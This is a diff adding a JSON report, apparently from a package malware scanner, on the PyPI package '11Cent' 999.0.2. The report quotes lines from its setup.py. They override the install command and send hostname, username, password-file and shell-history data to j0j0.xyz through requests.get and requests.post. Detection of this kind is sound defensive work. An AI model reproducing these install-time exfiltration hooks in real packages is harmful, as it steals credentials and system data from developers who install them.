@@ -1,0 +1,56 @@
+{
+    "issues": 7,
+    "errors": {},
+    "results": {
+        "exfiltrate-sensitive-data": [
+            {
+                "location": "setup.py:15",
+                "code": "        requests.get(\"https://j0j0.xyz/11cent\",params = ploads)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            },
+            {
+                "location": "setup.py:16",
+                "code": "        requests.get(\"http://\"+hostname+\".\"+username+\".j0j0.xyz/11cent\")\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            },
+            {
+                "location": "setup.py:17",
+                "code": "        requests.get(\"http://11cent.j0j0.xyz\",params = ploads)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            }
+        ],
+        "dll-hijacking": {},
+        "exec-base64": {},
+        "download-executable": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:27",
+                "code": "setup(name='11Cent',\n      version='999.0.2',\n      description='Exfiltration',\n      author='j0j0',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "steganography": {},
+        "silent-process-execution": {},
+        "clipboard-access": {},
+        "code-execution": {},
+        "obfuscation": {},
+        "shady-links": [
+            {
+                "location": "setup.py:15",
+                "code": "        requests.get(\"https://j0j0.xyz/11cent\",params = ploads)\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "setup.py:20",
+                "code": "            r = requests.post('https://j0j0.xyz/passwd/', data=payload, verify=True, headers=headers)\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "setup.py:23",
+                "code": "            r = requests.post('https://j0j0.xyz/history/', data=payload2, verify=True, headers=headers)\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ]
+    },
+    "path": "./dataset/pypi/11Cent-999.0.2"
+}
